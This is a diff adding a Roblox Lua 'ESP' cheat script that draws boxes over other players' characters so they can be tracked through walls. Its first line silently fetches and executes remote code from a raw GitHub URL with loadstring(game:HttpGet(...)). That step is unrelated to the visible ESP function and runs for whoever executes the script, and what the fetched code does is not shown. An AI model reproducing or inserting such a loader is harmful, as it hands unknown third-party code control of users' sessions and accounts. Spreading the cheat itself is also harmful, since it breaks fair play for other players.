@@ -1,0 +1,58 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mathbox20/forbuyer2/refs/heads/main/premiumsupport"))()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+
+local ESPObjects = {}
+
+local function removeESP(player)
+    local esp = ESPObjects[player]
+    if esp then
+        if esp.Box then esp.Box:Destroy() end
+        ESPObjects[player] = nil
+    end
+end
+
+local function createESP(player)
+    if player == LocalPlayer then return end
+    removeESP(player)
+    local box = Drawing.new("Square")
+    box.Thickness = 1
+    box.Filled = false
+    box.Color = Color3.fromRGB(0, 0, 255)
+    box.Transparency = 1
+    box.Visible = false
+
+    ESPObjects[player] = { Box = box }
+
+    player.CharacterRemoving:Connect(function() removeESP(player) end)
+end
+
+RunService.RenderStepped:Connect(function()
+    for player, esp in pairs(ESPObjects) do
+        local character = player.Character
+        if character and character:FindFirstChild("HumanoidRootPart") then
+            local topScreen, topOnScreen = Camera:WorldToViewportPoint(character.HumanoidRootPart.Position)
+            if topOnScreen then
+                esp.Box.Size = Vector2.new(20, 20)
+                esp.Box.Position = Vector2.new(topScreen.X - 10, topScreen.Y - 10)
+                esp.Box.Visible = true
+            else
+                esp.Box.Visible = false
+            end
+        else
+            if esp then esp.Box.Visible = false end
+        end
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then createESP(player) end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function() task.wait(1); createESP(player) end)
+end)
+
+Players.PlayerRemoving:Connect(removeESP) 
